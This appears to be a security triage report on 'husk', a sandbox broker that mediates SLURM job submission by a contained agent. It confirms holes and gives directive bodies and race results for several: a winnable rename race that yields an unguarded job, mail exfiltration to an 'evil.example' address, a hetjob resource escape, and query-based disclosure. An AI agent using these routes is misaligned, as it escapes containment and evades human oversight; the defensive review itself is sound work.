# B6 triage — the SINK × channel matrix (pass 2)

**Stance: refutation.** Every `CONFIRMED` in `findings/B6-findings.md` was treated as an
unverified claim. Code-only, this laptop, no cluster. Broker built from source
(`cargo build --release`, HEAD `2b8a8e1`), and the explicit binary
`slurm-broker/broker/target/release/husk-slurm-broker` was used — never the gitignored
`husk-slurm-broker-x86_64` prebuilt. Nothing under `broker/src` was modified; the real
`sbatch.rs` was **copied** to a scratch dir and driven, and the whole broker was exercised
in `--dry-run`/non-dry `--once` runs against scratch spools.

## Summary

| ID | Outcome | My severity | One line |
|----|---------|-------------|----------|
| **F1** | **CONFIRMED** | **CRITICAL** | The staged-guard TOCTOU race is *winnable on this laptop* (6/200 vs an instant-open sbatch, 33/100 vs a 2 ms window, 0/50 control); the agent controls the id, writes the spool, runs concurrently, and needs one win → an unguarded batch job. Docs (BROKER.md/PROTOCOL.md) assert the exact opposite property. |
| **F2** | **RECHARACTERISED** | LOW | Forwarding of raw `job_args` is real, but the impact the finder fears (parsed as sbatch *options*) is against SLURM's stop-at-script semantics — they land as the *script's* argv, passed through the guard as `"$@"` to the already-caged body. Real residual = a doc imprecision + no count/length bound. One-line hardware probe closes the permutation question. |
| **F3** | **CONFIRMED** | MEDIUM | `#SBATCH --mail-*` is accepted in the body and dropped *silently* on the CLI with nothing emitted to override it — reproduced against the real `sbatch.rs` and end-to-end (status: submitted). Egress via slurmctld SMTP, outside the cage. Whether mail leaves the site depends on `MailProg` (hardware). |
| **F4** | **CONFIRMED** | HIGH | `#SBATCH hetjob`/non-option tokens are skipped un-gated (`continue`). I built a het body that survives husk's **entire** policy (submitted) with a 2nd component on `--partition=normal --ntasks=512 --time=24:00:00` — the finder's own example was only caught incidentally. Complete resource-envelope escape on husk's side; needs the site to honor `#SBATCH hetjob`. |
| **F5** | **CONFIRMED** | MEDIUM | `--qos`/`--reservation` are `Class::Allowed` (agent-chosen, re-emitted) — proven against the real module — while THREAT-MODEL.md:321 claims the partition/account/qos family is "forced value wins". Both move the envelope the partition is meant to bound; bounded by the human's entitlements. |
| **F6** | **CONFIRMED** | LOW | `run_query_cmd` (scancel + queries) does no `env_remove`; only `run_sbatch` strips. `SCANCEL_*`/`SQUEUE_*` would be honored — but the agent cannot populate the broker's env, so today it is an unlisted-channel/doc-completeness gap, not an exploit. |
| **F7** | **CONFIRMED** | LOW | THREAT-MODEL says "a single partition"; the code takes a comma-separated set (live Balfrin = `pp-short,short`). Guarantee is the weakest member's and nothing checks it. Doc already carries the operator caveat but frames it as one choice. |
| **F8** | **CONFIRMED** | INFORMATIONAL | The row says "env stripped"; in fact `req.env` is never read on the submit path except 3 uenv keys, and the forced CLI `--output` dominates anyway. Severance-by-omission, not a strip — and no regression test pins it. |
| **F9** | **CONFIRMED** | INFORMATIONAL | `HUSK_SLURM_ACCOUNT` = bare `nonempty()`, no charset grammar unlike `parse_partition_list`. Operator config, single argv element → can't split. Four-line asymmetry. |
| **F10** | **CONFIRMED** | LOW | The `SBATCH_UENV*` env sub-cell (F26's third channel, guarding a root squashfs mount) is read in `policy.rs` but exercised by nothing — every test/arm ships empty `env`. Unproven cell, not a demonstrated hole. |
| **F11** | **CONFIRMED** | MEDIUM (could be HIGH) | The read-only query verb has no row and forwards the **entire** agent argv verbatim into another SLURM binary, run outside the cage with the human's full FS view. Design gap confirmed on laptop; the concrete disclosure shapes (`sacct --completion --file=`, `--batch-script`, `squeue --json`) need a slurmd. |
| **Structural** | **CONFIRMED** | MEDIUM | `Ignored` is an ungated `#SBATCH` channel *by construction*: dropped on CLI, forwarded verbatim in the body, nothing emitted to override. Root cause under F3 and F12. |
| **F12** | **CONFIRMED** | MEDIUM | `run_sbatch` is a bare `cmd.output()` with **no** watchdog/process-group, unlike its sibling `run_query_cmd` — any hung sbatch wedges the single-threaded broker forever (no further sbatch/squeue/**scancel**). `#SBATCH --wait` is accepted in the body; whether it triggers the wedge needs a slurmd, but the missing-watchdog defect is laptop-confirmed. |

**Overlaps flagged, not resolved:** F1 ↔ A3 (job-script-body) and A5 (full-chain), and the
exploit belongs to workstream A. F3 & F12 are instances of the Structural finding. F4, F5,
F7 all concern the resource-envelope control. F11 ↔ A7 (message-disclosure), as the finder
noted. F6 & F8 are env-channel doc-completeness items.

---

## F1 — the staged guard script is handed to sbatch **by path**, in an agent-writable dir → CONFIRMED, CRITICAL

### What I did
1. Read the submit path: `spool.rs:171-181`. `submit()` does `write_atomic(job-<id>.sh, wrapped_script)` (which writes `.job-<id>.sh.tmp` with `create_new|O_NOFOLLOW`, `sync_all`, then `rename(tmp, job-<id>.sh)`), builds `argv = ["sbatch","--parsable", …forced opts…, <script_path>, …job_args…]`, and calls `run_sbatch(argv)`. `run_sbatch` (`spool.rs:398-407`) is a plain `Command::new("sbatch").args(...).output()` — it passes the **path string** (`spool.rs:179`), holds **no fd**, and does **no re-read/re-validation**. So sbatch opens the file by path, and the whole guard lives *inside that file's bytes*.
2. Confirmed the preconditions all hold: the spool is agent-writable by design (`lib.rs:38-52`, "so it MUST live somewhere the agent can write … Everything in here is agent-writable"), it is bind-mounted writable into the cage, `id` is `req.id` (agent-chosen, only validated as a safe path component — `spool.rs:426-430`), so `<spool>/job-<id>.sh` is a path the agent knows and can write. The agent (stub) writes `req-<id>.json` and polls for `resp-<id>.json`; it — or any process it spawns inside the cage — runs concurrently with the broker's 200 ms poll loop.
3. **Won the race on this laptop.** Built a compiled C `sbatch` that finds the `.sh` positional and `open()`s it as its *first* meaningful action (a lower bound on the real window — real sbatch parses all options + reads `slurm.conf` + loads plugins before reading the script), and a C attacker that tight-loops `rename(attacker.sh, job-<id>.sh)`. 200 real submissions through the built broker (non-dry, `--once`), fake sbatch on PATH:

```
attacker: 140800 renames
    194 guard
      6 WON        # sbatch read ATTACKER-PAYLOAD instead of the guard
total sbatch invocations: 200
```

Control (attacker disabled, 50 submissions): **50 guard, 0 WON** — the wins are genuine
post-rename races, not artifacts. Widening the pre-open window to a realistic **2 ms**
(models sbatch's option-parse + `slurm.conf` read + plugin load before it reads the script):
**33/100 WON** — confirming the mechanism is exactly *sbatch opens by path after the broker's
rename*, and the win rate scales with how much sbatch does before opening.

4. Confirmed the docs-vs-code contradiction verbatim:
   - `BROKER.md:214-217`: "The broker writes that immutable snapshot to a **broker-controlled path** … never a path the agent can rewrite between validation and slurmd reading it."
   - `PROTOCOL.md:197-199`: "The broker submits *this snapshot*, never a path the agent could rewrite between validation and slurmd reading it (TOCTOU)."
5. Confirmed the *existing* F1 test cannot catch this (protocol rule 7): `write_atomic_refuses_a_planted_symlink_at_the_tmp_path` (`spool.rs:500-518`) exercises only the **pre-plant** `.tmp` symlink case. The **post-rename** window has no test — the test passes while the race is fully open.

### Verdict & severity
CONFIRMED. The race is winnable, all preconditions hold from inside the cage, and — the
decisive point — the agent controls submissions and only needs to win **once**: a 3% per-attempt
rate against an instantly-opening sbatch (higher against the real one) is an effectively
guaranteed bypass under repetition. A won race yields a batch job whose entire content is
agent-chosen with **no re-exec guard** — no `bwrap`, no `seccomp-wrapper`, no `--unshare-net`,
no `/run/munge` mask — i.e. a total compute-side cage bypass that reopens AV8. That is the
whole point of husk's compute containment, reachable with no special privilege. **CRITICAL.**
The one piece the laptop cannot show is a real slurmd running the swapped file unguarded as the
batch job; the mechanism is otherwise fully established here.

**Settles it on hardware (belt-and-suspenders, not required to act):** on a login node, submit
through husk while a background loop renames `<spool>/job-<id>.sh` for a known id, with the
attacker script writing a marker only an *unguarded* job could produce (e.g. read `/users/...`,
which the cage tmpfs-masks). A marker in the job output = confirmed end-to-end.

Commands (scratchpad `f1/`): `cc -O2 sbatch.c -o bin/sbatch; cc -O2 attacker.c -o attacker`;
per trial `attacker 12 <targets…> & ; (cd proj && PATH=bin:$PATH RACE_RESULT=… husk-slurm-broker --spool SPOOL --once)`.

---

## F2 — raw `job_args` appended to the real sbatch argv → RECHARACTERISED, LOW

### What I did
Confirmed the forwarding: `policy.rs:375` (`job_args: req.job_args.clone()`) → `spool.rs:180`
(`argv.extend(sub.job_args)`), appended after the script path with **no** grammar, length,
count, or `-` check. The docs claim "No raw agent token reaches slurmd" (`policy.rs:341-342`)
is therefore imprecise.

Then I attacked the **impact** claim. The finder's exploitation rests on "sbatch permutes
options after the first positional (GNU `getopt_long` default)". That is contradicted by
SLURM's actual argument model and by the repo's own code:

- SLURM's `sbatch` stops interpreting *its own* options at the script positional; everything
  after the script is passed to the **script** as `$1, $2, …`. This is the well-known SLURM
  gotcha ("put sbatch options *before* the script").
- The repo is built on exactly that model: the stub's `parse_invocation`
  (`sbatch-stub.py:131-132`) defines `job_args = argv[i+1:]` (tokens *after* the script), and
  `PROTOCOL.md` documents `"job_args": ["42"]` as an argument to `job.sh`.
- The guard re-execs `… bwrap … -- /bin/bash "$0" "$@"` (`policy.rs:894`), so `job_args` reach
  the **already-caged body** as positional parameters — data the user's own script may consume,
  not sbatch options and not a cage/envelope escape.
- The broker deliberately front-loads its forced options *before* the script path
  (`spool.rs:177-179`), which only makes sense — and is only necessary — under stop-at-script
  semantics.

### Verdict & severity
RECHARACTERISED. The forwarding is real (finder right there), but the mechanism is materially
different from the stated one: `job_args` are **script arguments**, passed through the guard to
the caged body, which is their documented purpose. Real residual: a doc imprecision, plus the
absence of any count/length bound (a huge `job_args` would hit `ARG_MAX` and fail the
submission with `E2BIG` — a self-limiting nuisance, not a broker wedge). **LOW.**

I could not run a real sbatch, so the permutation question is not *measured* here — if, against
SLURM's documented behavior, this site's sbatch permutes, F2 escalates to a genuine ungated
option channel. The finder's own one-line probe settles it:
`sbatch --partition=<forced> --hold --parsable /tmp/hello.sh --job-name=CANARY` then
`scontrol show job` — `JobName=CANARY` would mean permutation is on. Add it to
`directive-parity-probe.sh`.

---

## F3 — mail is ungated egress via `#SBATCH` → CONFIRMED, MEDIUM

### What I did
Compiled the real `broker/src/sbatch.rs` standalone (it is std-only, no crate deps) and drove
`body_reject_reason` / `interpret_cli`:

```
ACCEPTED  mail-user body   body="…#SBATCH --mail-user=x@evil.example…"
ACCEPTED  mail-type body   body="…#SBATCH --mail-type=ALL…"
CLI-OK    mail-user cli    re-emit=[]      # dropped silently
CLI-OK    mail-type cli    re-emit=[]
```

Then end-to-end through the built broker (`--dry-run --once`): a body with both `#SBATCH`
mail lines returns **status: submitted**, and the mail directives survive verbatim into the
staged script. `--mail-*` is `Class::Ignored` (`sbatch.rs:184-185`) — dropped on the CLI,
accepted in the body, with husk emitting nothing to override.

### Verdict & severity
CONFIRMED gate gap. The mail is composed and sent by **slurmctld over SMTP**, outside the
cage, `--unshare-net`, and husk's egress proxy — a low-bandwidth exfil channel from a job husk
deliberately gave no network. The job name is agent-chosen (`v_name`, 64 bytes) and rides the
subject; `--array` (also `Allowed`) multiplies the message count. Also breaks the
teaching-message property (silent CLI drop vs body-works). **MEDIUM** — real but low-bandwidth,
and whether mail actually leaves depends on the site's `MailProg` (a hardware/site fact, not
laptop-settleable).

---

## F4 — `#SBATCH hetjob` is invisible to the body gate → CONFIRMED, HIGH

### What I did
`body_reject_reason` (`sbatch.rs:406-411`) skips every `#SBATCH` token not starting with `-`
(`if !tok.starts_with('-') { i += 1; continue; }`). Against the real module:

```
ACCEPTED  hetjob keyword
ACCEPTED  packjob keyword
ACCEPTED  het two components  (…#SBATCH hetjob…#SBATCH --partition=normal…)
```

I then **broke the finder's own example and found a stronger one.** The finder's two-component
body was actually *rejected* end-to-end — but only incidentally, because it included
`#SBATCH --nodes=64`, and husk scans **all** `#SBATCH` directives globally for `--nodes` and
refuses ≠1 (`resp: "husk brokers single-node jobs only, but this asks for --nodes=64"`). So I
dodged the two global checks:
- husk's partition check short-circuits (`.or_else`, `policy.rs:114-115`): once it finds the
  CLI `--partition`, a component-1 `#SBATCH --partition=normal` is **never validated**.
- husk's node check scans directives for `--nodes`; use `--ntasks` instead.

This body is **submitted** (status: submitted) and reaches slurmd verbatim:
```
#SBATCH hetjob
#SBATCH --partition=normal
#SBATCH --ntasks=512
#SBATCH --time=24:00:00
```
husk's forced `--partition`/`--nodes=1` are on the **CLI**, which applies to component 0 only;
component 1 escapes the resource-envelope control entirely — non-preemptible partition, 512
tasks, 24 h wall, none validated.

### Verdict & severity
CONFIRMED, and stronger than pass 1 stated. The batch script runs on component 0, so the cage
is intact — this is a **resource-envelope escape, not a containment escape**, which on a shared
cluster is exactly the modeled threat. **HIGH:** it defeats husk's single documented control on
resource *magnitude*, reachable by any agent whose human can use a second partition, with the
escape complete on husk's side. The only uncertainty is whether the site's SLURM honors
`#SBATCH hetjob` — a standard SLURM feature, so almost certainly yes. `directive-parity-probe.sh`
does not cover this (its variants always follow `#SBATCH` with `--job-name=<canary>`, never a
non-option token). **Hardware:** submit the escape body through husk with `--hold`, check
`scontrol show job` for `HetJobId`/component-1 partition, cancel immediately.

---

## F5 — `--qos`/`--reservation` are `Allowed`, the row claims forced → CONFIRMED, MEDIUM

### What I did
Against the real module: `interpret_cli(["--qos=highprio"]) → ["--qos=highprio"]` and
`["--reservation=myres"] → ["--reservation=myres"]` (re-emitted verbatim after grammar check);
both accepted in the body. Registry: `sbatch.rs:154` (`--qos`, `Class::Allowed`, `v_name`) and
`sbatch.rs:161` (`--reservation`, `Class::Allowed`, `v_name`). End-to-end, a request with
`--qos=highprio --reservation=myres` is submitted and both appear in the emitted argv.
THREAT-MODEL.md:321 row: "**partition/account/qos** … forced value wins; mismatch rejected" —
true for `--partition` (Forced, re-emitted) and `--account` (`sbatch.rs:160`, Forced), **false**
for qos and reservation. No test or selftest arm covers either option.

### Verdict & severity
CONFIRMED registry-class-vs-row mismatch. Not cosmetic: THREAT-MODEL delegates resource
*magnitude* to "the site's own QOS and preemption", and a QOS carries priority, `MaxWall`,
`GrpTRES`, and `PreemptMode` — so an agent naming a QOS its human is entitled to can raise the
ceiling or make the job non-preemptible, the very control the envelope rests on; a reservation
puts it on uncontended nodes. **MEDIUM** — a real weakening of the documented control, bounded
by the human's sacctmgr/reservation entitlements (the agent reaches only what its human can).
Overlaps F4/F7 (all resource-envelope).

---

## F6 — scancel/queries run with the broker's env unfiltered → CONFIRMED, LOW

### What I did
`run_query_cmd` (`spool.rs:307-324`) is `Command::new(&argv[0]) … process_group(0).spawn()` with
**no** `env_remove`; it serves both `run_query` (Tier-1 queries) and `cancel` (scancel). Only
`run_sbatch` (`spool.rs:398-404`) strips, and only the four `STRIPPED_SUBMIT_ENV` names. So
`scancel(1)`'s `SCANCEL_*` selector family and `SQUEUE_*`/`SACCT_*` would be honored from the
broker's environment.

### Verdict & severity
CONFIRMED as an unlisted channel. But the broker's env is the **human's pre-agent login env**;
`req.env` is never forwarded into the query/scancel child (it is read only for the 3 uenv keys
in policy), so the agent cannot populate `SCANCEL_*`. Today this is a documentation-completeness
gap — the scancel section lists no env channel while the sbatch rows list `SBATCH_*` — not an
exploit. **LOW.**

---

## F7 — resource-envelope guarantee written for one partition, code takes a list → CONFIRMED, LOW

### What I did
`THREAT-MODEL.md:367` "is forced onto, **a single partition**", :368 "Choose a **preemptible**
one and the property is structural", vs `session.rs:28-39` `parse_partition_list` (comma-
separated set) and `policy.rs:133-147` (resolve against the set). The live config is real, not
hypothetical: `bringup-balfrin-ln003.txt:1` shows `partition=pp-short of [pp-short,short]`.

### Verdict & severity
CONFIRMED docs-vs-code. With a set the structural guarantee is the weakest member's and nothing
checks preemptibility. The doc *does* already carry the core operator caveat (`:380`, "if the
partition recorded at install is not actually preemptible, this control silently is [gone]"),
but frames it as one choice and hasn't been updated for the set. **LOW**, operator-facing — the
magnitude control is delegated to the operator's partition choice by explicit design.

---

## F8 — the stdout/stderr row says "env stripped"; nothing strips it → CONFIRMED, INFORMATIONAL

### What I did
`req.env` is read on the submit path **only** at `policy.rs:173, 189-190` (SBATCH_UENV/_VIEW/
_REPO), never to build the emitted argv; `run_sbatch` inherits the broker's own env. So an
agent's `req.env["SBATCH_OUTPUT"]` never reaches sbatch. And even the human's own env
`SBATCH_OUTPUT` would lose to the unconditionally-forced CLI `--output` (precedence CLI>env).
The control is severance-by-omission, not a strip.

### Verdict & severity
CONFIRMED docs-vs-code, no exploit. The real content is a missing regression test: nothing pins
that `req.env` cannot influence the argv, so a future `--export`-narrowing change could silently
un-dominate several rows at once. `PROTOCOL.md`'s example request even ships
`"env": {"SBATCH_OUTPUT": "…/.bashrc"}` with no test behind it. **INFORMATIONAL.**

---

## F9 — `HUSK_SLURM_ACCOUNT` has no value grammar → CONFIRMED, INFORMATIONAL

### What I did
`session.rs:145` `account: nonempty("HUSK_SLURM_ACCOUNT")` (bare non-empty) vs
`parse_partition_list` (drops whitespace/`$`/`;`/leading-`-`). The account is emitted as one
argv element (`--account={acct}`), so a hostile value cannot split into a second option.

### Verdict & severity
CONFIRMED, minor asymmetry between two operator inputs on the same path to the same parser.
Operator config is trusted and the value can't split; four-line fix. **INFORMATIONAL.**

---

## F10 — the `SBATCH_UENV*` cell is read but exercised by nothing → CONFIRMED, LOW

### What I did
`policy.rs:173, 189-190` read `req.env["SBATCH_UENV"|"SBATCH_UENV_VIEW"|"SBATCH_UENV_REPO"]` and
reject on mismatch (F26's third channel). The policy test helper hard-codes
`env: BTreeMap::new()` (`policy.rs:1006`) and every selftest request ships `"env": {}`
(`selftest.sh:153`). So this channel is never exercised.

### Verdict & severity
CONFIRMED unproven cell. The code looks correct — this is a test gap, not a demonstrated hole —
but the sink is a **root-privileged squashfs mount by slurmstepd**, the worst place to leave a
channel unverified. **LOW.** Fix = the finder's three unit cases + one selftest arm that sets
`env` in `mkreq`. (This is precisely the kind of untested-since-it-could-not-fail gap protocol
rule 7 warns about.)

---

## F11 — the read-only query verb has no row and forwards the whole argv → CONFIRMED, MEDIUM (could be HIGH)

### What I did
`policy.rs:79-83`: for any name in `READONLY_SLURM`, `argv.extend(req.argv.iter().cloned())` —
the **entire** agent argv is forwarded verbatim; the only gate is the command name. These run
via `run_query`/`run_query_cmd` in the broker's context: outside the cage, with MUNGE, network,
and the human's full FS view (including `/users`, which the cage tmpfs-masks). Up to 1 MiB of
stdout returns into the cage (`cap_output`).

### Verdict & severity
CONFIRMED that the verb is unrowed and forwards adversary bytes into another SLURM binary's
parser — the one place husk does this deliberately. The DoS side is genuinely closed (the 60 s
watchdog + process-group kill, `spool.rs:307-352`, tested by `run_query_cmd_kills_a_hanging_command`).
The **disclosure** shapes need a slurmd and are unproven here: `sacct --completion --file=<a
cage-hidden path>` as a read oracle; `sacct --batch-script -j <id>` / `squeue --json` dumping
every job the uid owns — including the human's production scripts, working dirs and submit
lines that the cage otherwise hides. **MEDIUM now, could be HIGH** if the file-read oracle or
cross-job dump works. **Hardware:** run each of the three probes through husk on a login node
and read the returned stdout. Overlaps A7 (message-disclosure).

---

## Structural — `Ignored` is an ungated `#SBATCH` channel by construction → CONFIRMED, MEDIUM

### What I did
Confirmed the three-behaviour body gate: `body_reject_reason` treats `Class::Forced | Ignored`
identically as "dropped" on the CLI (`sbatch.rs:364`) but in the body an `Ignored` option is
neither rejected nor overridden — it is forwarded verbatim with nothing emitted to dominate it.
The `Forced`-is-safe reasoning (`sbatch.rs:419-423`, "only safe BECAUSE the emission is
unconditional") was never applied to `Ignored`, whose emission is not conditional but **absent**.
Demonstrated directly: `--mail-type`, `--mail-user`, `--wait` all accepted in the body, dropped
on CLI (F3, F12). The other `Ignored` names — `--parsable`, `--quiet`, `--verbose` — are the
same shape.

### Verdict & severity
CONFIRMED. This is the root cause under F3 and F12 and the highest-leverage fix: an invariant
that `Ignored` is legal only for an option husk also emits an overriding value for (or a fifth
class), pinned by a registry test in the style of `interpret_cli_never_reemits_a_forced_option`.
**MEDIUM** (class-level gap; its concrete instances carry their own severities above).

---

## F12 — `#SBATCH --wait` accepted + `run_sbatch` has no timeout → CONFIRMED, MEDIUM

### What I did
`--wait` is `Class::Ignored` (`sbatch.rs:181`), dropped on the CLI *specifically* to stop it
wedging the broker — but against the real module `#SBATCH --wait` is **accepted** in the body.
And `run_sbatch` (`spool.rs:398-407`) is a bare `cmd.output()`: **no watchdog, no process
group, no timeout** — in direct contrast to `run_query_cmd` right above it (`spool.rs:307-352`),
which was hardened for exactly this DoS class. The broker's request loop is single-threaded
(`main.rs:506-519`).

### Verdict & severity
CONFIRMED. The actionable defect is laptop-confirmed independent of `--wait`: **any** hung
sbatch (a slow slurmctld, a stuck plugin, `--wait` honored from the body) wedges the whole
broker — no further sbatch, no squeue, and critically no **scancel**, so neither the agent nor a
human going through husk can stop the wedging job. **MEDIUM** — a recoverable availability DoS
(kill/restart the broker), self-inflicted, but it disables the one control (scancel) that would
recover it. The specific `#SBATCH --wait` trigger needs a slurmd (`sbatch --hold --parsable
/tmp/hello.sh` with `#SBATCH --wait` in the body — does it block or return?); the missing
watchdog is worth fixing regardless.

---

## Note on coverage

All 12 findings plus the structural finding were triaged. F1 (the priority) is settled on the
laptop as CONFIRMED/CRITICAL with a demonstrated winnable race. Everything that could be settled
by driving the real `sbatch.rs` or the built broker was (F3, F4, F5, F12, Structural, and the
code-claims under F6–F11). The residual hardware items are narrow and named per finding: F2's
permutation probe, F3's `MailProg`, F4's `hetjob`-honoring, F11's three disclosure probes, F12's
`--wait`-blocking. None of those change the *design-gap* verdicts, which are all laptop-confirmed;
they bound the *impact*.
